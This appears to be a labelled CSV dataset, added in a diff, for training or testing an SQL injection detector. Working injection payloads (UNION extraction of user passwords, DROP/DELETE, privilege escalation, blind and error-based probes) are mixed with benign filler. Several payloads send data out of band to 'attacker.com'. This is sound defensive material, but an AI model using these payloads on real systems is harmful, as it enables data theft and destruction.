@@ -1,0 +1,101 @@
+payload,label
+"1' union select null, null, null --",1
+hello world 116,0
+hello world 106,0
+1; DROP TABLE users; --,1
+"1' UNION SELECT null, table_name FROM information_schema.tables --",1
+"1"" OR ""X""=""X",1
+1' and sleep(5)--,1
+hello world 151,0
+"Standard JSON format: {""name"": ""Test""}",0
+hello world 88,0
+hello world 235,0
+hello world 174,0
+' or '1'='1,1
+1';/**/CREATE/**/TABLE/**/hacked/**/(info/**/text);/**/--,1
+"1' and (select 1 from (select count(*), concat(floor(rand(0)*2), database())x from information_schema.tables group by x)a)--",1
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 232",1
+"1'/**/AND/**/extractvalue(1,/**/concat(char(126),/**/md5(123)))--",1
+"1; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",1
+"1"" OR 1=1",1
+hello world 191,0
+ADMIN'--,1
+"1 union select 1, 2, 3",1
+"1'/**/UNION/**/SELECT/**/@@version,/**/null,/**/null/**/--",1
+hello world 214,0
+hello world 71,0
+Rating: 4.5/5,0
+"1' AND CONVERT(INT, @@VERSION)--",1
+hello world 230,0
+admin@suraksha.ai,0
+hello world 221,0
+"1 UNION SELECT username, password FROM users",1
+1'/**/OR/**/1=1/**/LIMIT/**/1,1
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 242",1
+1; drop table users; --,1
+hello world 203,0
+hello world 179,0
+1; delete from users; --,1
+rishi,0
+Who's there?,0
+';/**/UPDATE/**/users/**/SET/**/role='admin'/**/WHERE/**/id=1;/**/--,1
+1' and (select load_file('\\attacker.com\share\file'))--,1
+hello world 102,0
+hello world 92,0
+1'/**/AND/**/(SELECT/**/LOAD_FILE('\\attacker.com\share\file'))--,1
+hello world 74,0
+hello world 149,0
+"1' AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM USERS WHERE USERNAME='ADMIN') > 64--",1
+That's a great feature!,0
+'; update users set role='admin' where id=1; --,1
+hello world 207,0
+search query for security systems,0
+hello world 160,0
+Select * from the dashboard menu.,0
+1' AND (SELECT DBMS_LDAP.search('attacker.com') FROM dual)--,1
+1' or 1=1,1
+1' AND cast(@@version as int)--,1
+hello world 87,0
+hello world 202,0
+"1' AND 1=OPENROWSET('SQLNCLI', 'SERVER=ATTACKER.COM;TRUSTED_CONNECTION=YES', 'SELECT * FROM MASTER.DBO.SYSPROCESSES')--",1
+hello world 130,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 243",1
+1 + 1 = 2,0
+1' or 'x'='x,1
+hello world 189,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 226",1
+hello world 129,0
+"1' AND BENCHMARK(10000000,MD5(1))--",1
+' OR 1=1 --,1
+hello world 107,0
+1' or 1=1 limit 1,1
+test' or 1=1 --,1
+hello world 242,0
+hello world 187,0
+1'/**/AND/**/1=1--,1
+hello world 103,0
+"1""/**/OR/**/""x""=""x",1
+1' AND (SELECT UTL_SMTP.CONNECTION('ATTACKER.COM') FROM DUAL)--,1
+"1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --",1
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 248",1
+"1' UNION SELECT username, password FROM users --",1
+hello world 157,0
+"1;/**/INSERT/**/INTO/**/users/**/(username,/**/password)/**/VALUES/**/('attacker',/**/'pass')--",1
+hello world 239,0
+hello world 121,0
+hello world 249,0
+admin'/**/--,1
+hello world 210,0
+hello world 208,0
+hello world 99,0
+"1'/**/AND/**/BENCHMARK(10000000,MD5(1))--",1
+Total count: 100,0
+1' AND (SELECT 1) = 1--,1
+hello world 246,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 249",1
+admin'--,1
+new_user'/*,1
+hello world 169,0
+agent@suraksha.ai,0
+Let's review the reports tomorrow morning.,0
+hello world 188,0
